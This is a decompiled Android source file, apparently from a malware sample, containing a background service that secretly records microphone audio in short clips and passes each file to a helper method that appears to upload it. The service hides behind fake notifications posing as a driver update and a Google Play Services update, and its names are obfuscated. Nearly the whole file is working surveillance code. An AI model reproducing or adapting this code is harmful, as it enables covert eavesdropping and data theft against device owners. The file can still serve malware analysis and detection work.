package wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr;

import android.annotation.TargetApi;
import android.app.IntentService;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Log;
import java.io.IOException;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.R;

/* JADX INFO: loaded from: classes.dex */
public class brtltydqhiuqbb extends IntentService {

    /* JADX INFO: renamed from: a */
    String f524a;

    /* JADX INFO: renamed from: b */
    boolean f525b;

    /* JADX INFO: renamed from: c */
    C0020b f526c;

    /* JADX INFO: renamed from: d */
    Context f527d;

    /* JADX INFO: renamed from: e */
    private Notification f528e;

    public brtltydqhiuqbb() {
        super("cpysnikhf");
        this.f524a = "";
        this.f526c = new C0020b();
    }

    @TargetApi(16)
    /* JADX INFO: renamed from: a */
    private void m327a() {
        this.f528e = new Notification.Builder(this.f527d).setContentTitle("Info").setContentText("Update The Driver System..").setSmallIcon(R.drawable.im).build();
        startForeground(9906, this.f528e);
    }

    /* JADX INFO: renamed from: a */
    void m328a(final Context context, final String str, final int i) {
        final MediaRecorder mediaRecorder = new MediaRecorder();
        this.f526c.m230a("SOUND", "START RECORD SOUND");
        this.f525b = false;
        mediaRecorder.setAudioSource(1);
        mediaRecorder.setOutputFormat(3);
        mediaRecorder.setAudioEncoder(1);
        mediaRecorder.setOutputFile(str);
        Thread thread = new Thread(new Runnable() { // from class: wocwvy.czyxoxmbauu.slsa.oyqwzkyy.hzgktdtr.brtltydqhiuqbb.1
            @Override // java.lang.Runnable
            public void run() {
                C0020b c0020b;
                String str2;
                StringBuilder sb;
                try {
                    Thread.sleep(i * 1000);
                    brtltydqhiuqbb.this.f526c.m230a("SOUND", "STOP RECORD SOUND");
                    try {
                        mediaRecorder.stop();
                        mediaRecorder.release();
                        brtltydqhiuqbb.this.f525b = true;
                        Log.e("FILE", "" + str);
                        brtltydqhiuqbb.this.f526c.m228a(context, str, "", "sound[]");
                    } catch (Exception e) {
                        e = e;
                        c0020b = brtltydqhiuqbb.this.f526c;
                        str2 = "ERROR";
                        sb = new StringBuilder();
                        sb.append("Record Sound! ");
                        sb.append(e);
                        c0020b.m230a(str2, sb.toString());
                    }
                } catch (InterruptedException unused) {
                    brtltydqhiuqbb.this.f526c.m230a("SOUND", "STOP RECORD SOUND");
                    try {
                        mediaRecorder.stop();
                        mediaRecorder.release();
                        brtltydqhiuqbb.this.f525b = true;
                        Log.e("FILE", "" + str);
                        brtltydqhiuqbb.this.f526c.m228a(context, str, "", "sound[]");
                    } catch (Exception e2) {
                        e = e2;
                        c0020b = brtltydqhiuqbb.this.f526c;
                        str2 = "ERROR";
                        sb = new StringBuilder();
                        sb.append("Record Sound! ");
                        sb.append(e);
                        c0020b.m230a(str2, sb.toString());
                    }
                } catch (Throwable th) {
                    brtltydqhiuqbb.this.f526c.m230a("SOUND", "STOP RECORD SOUND");
                    try {
                        mediaRecorder.stop();
                        mediaRecorder.release();
                        brtltydqhiuqbb.this.f525b = true;
                        Log.e("FILE", "" + str);
                        brtltydqhiuqbb.this.f526c.m228a(context, str, "", "sound[]");
                        throw th;
                    } catch (Exception e3) {
                        e = e3;
                        c0020b = brtltydqhiuqbb.this.f526c;
                        str2 = "ERROR";
                        sb = new StringBuilder();
                        sb.append("Record Sound! ");
                        sb.append(e);
                        c0020b.m230a(str2, sb.toString());
                    }
                }
            }
        });
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
            thread.start();
        } catch (IOException unused) {
        }
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        this.f526c.m230a("Start", "cpysnikhf");
        this.f527d = this;
        this.f525b = true;
        if (intent.getStringExtra("str").equals("foreground")) {
            if (Build.VERSION.SDK_INT >= 26) {
                C0020b c0020b = this.f526c;
                C0020b.m215a((Service) this, "Google", "Update Google Play Service");
            } else {
                m327a();
            }
        }
        loop0: while (true) {
            int i = 0;
            while (true) {
                if (this.f525b) {
                    C0020b c0020b2 = new C0020b();
                    if (c0020b2.m251e(this, "sound").equals("stop") || c0020b2.m251e(this, "websocket").equals("")) {
                        break loop0;
                    }
                    try {
                        this.f524a = getExternalFilesDir(null) + "/" + i;
                        Log.e("+", "" + this.f524a + ".amr");
                        m328a(this.f527d, this.f524a + ".amr", 3);
                        i++;
                        if (i >= 10) {
                            break;
                        }
                    } catch (Exception unused) {
                        c0020b2.m230a("RecordSound", "ERROR!");
                    }
                }
            }
        }
        stopService(intent);
    }
}
